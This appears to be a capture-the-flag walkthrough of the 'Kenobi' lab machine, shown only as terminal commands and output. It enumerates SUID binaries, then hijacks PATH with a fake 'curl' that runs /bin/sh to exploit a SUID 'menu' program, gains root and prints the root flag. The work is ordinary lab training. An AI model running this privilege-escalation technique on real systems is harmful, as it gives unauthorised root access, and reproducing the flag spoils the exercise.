
```Bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

```Bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

```Bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Wed, 19 Jul 2023 03:48:15 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

```Bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
4.8.0-58-generic
```

```Bash
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
eth0      Link encap:Ethernet  HWaddr 02:4d:07:e3:d9:3f  
          inet addr:10.10.42.141  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::4d:7ff:fee3:d93f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:453 errors:0 dropped:0 overruns:0 frame:0
          TX packets:585 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:41245 (41.2 KB)  TX bytes:75009 (75.0 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:198 errors:0 dropped:0 overruns:0 frame:0
          TX packets:198 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:15503 (15.5 KB)  TX bytes:15503 (15.5 KB)
```

```Bash
kenobi@kenobi:~$ curl -I localhost
HTTP/1.1 200 OK
Date: Wed, 19 Jul 2023 03:48:43 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html
```

```Bash
kenobi@kenobi:~$ uname -r
4.8.0-58-generic
```

```Bash
kenobi@kenobi:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:4d:07:e3:d9:3f  
          inet addr:10.10.42.141  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::4d:7ff:fee3:d93f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:379 errors:0 dropped:0 overruns:0 frame:0
          TX packets:527 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:36515 (36.5 KB)  TX bytes:65400 (65.4 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:188 errors:0 dropped:0 overruns:0 frame:0
          TX packets:188 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:14442 (14.4 KB)  TX bytes:14442 (14.4 KB)
```

```Bash
kenobi@kenobi:~$ cd /tmp
```

```Bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl
```

```Bash
kenobi@kenobi:/tmp$ chmod 777 curl
```

```Bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

```Bash
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# 
```

```Bash
# whoami
root
```

```Bash
# cat /root/root.txt
177b3cd8562289f37382721c28381f02
```

